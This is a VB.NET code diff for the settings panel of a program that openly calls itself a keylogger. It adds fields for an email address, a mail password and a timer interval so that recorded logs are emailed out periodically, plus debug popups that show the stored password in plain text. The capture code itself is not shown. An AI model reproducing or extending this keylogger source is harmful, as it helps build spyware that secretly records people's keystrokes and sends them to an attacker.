@@ -26,6 +26,9 @@
     
     Private Sub controlpanel_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Label1.Text = "Welcome, " + My.Settings.USER
+        If My.Settings.mailpass = vbNullString Then
+            Label9.Visible = True
+        End If
     End Sub
 
     
@@ -41,7 +44,7 @@
 
     Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
         TextBox1.Text = "keylogger started at: " & Now & vbNewLine
-
+        Form1.tmrEmail.Interval = My.Settings.time * 60000
         Form1.Show()
         Button1.Enabled = False
     End Sub
@@ -60,24 +63,24 @@
 
 
     Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles TrackBar1.Scroll
-        TrackBar1.Value = 0
+        TrackBar1.Minimum = 1
+        TrackBar1.Maximum = 10
+        TextBox4.Text = TrackBar1.Value
+
     End Sub
 
     Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
-        If (TextBox2.Text = vbNullString) Or (TextBox3.Text = vbNullString) Then
-        ElseIf (Not (TextBox2.Text = vbNullString And Not TextBox3.Text = vbNullString)) Then
-            My.Settings.PASSWORD = TextBox2.Text
+        If Not (TextBox3.Text = vbNullString) And Not (TextBox2.Text = vbNullString) Then
             My.Settings.mail = TextBox3.Text
-            My.Settings.Save()
-            Label8.Text = "Settings has been saved!"
-        ElseIf (Not (TextBox2.Text = vbNullString) And (TextBox3.Text = vbNullString)) Then
-            My.Settings.PASSWORD = TextBox2.Text
-            My.Settings.Save()
-            Label8.Text = "Settings has been saved!"
-        Else
-            My.Settings.mail = TextBox3.Text
+            My.Settings.mailpass = TextBox2.Text
+            My.Settings.time = TrackBar1.Value
             My.Settings.Save()
             Label8.Text = "Settings has been saved!"
         End If
+        MsgBox("Email" + My.Settings.mail + "Pass" + My.Settings.mailpass)
+        MsgBox(My.Settings.time)
+
     End Sub
+
+   
 End Class
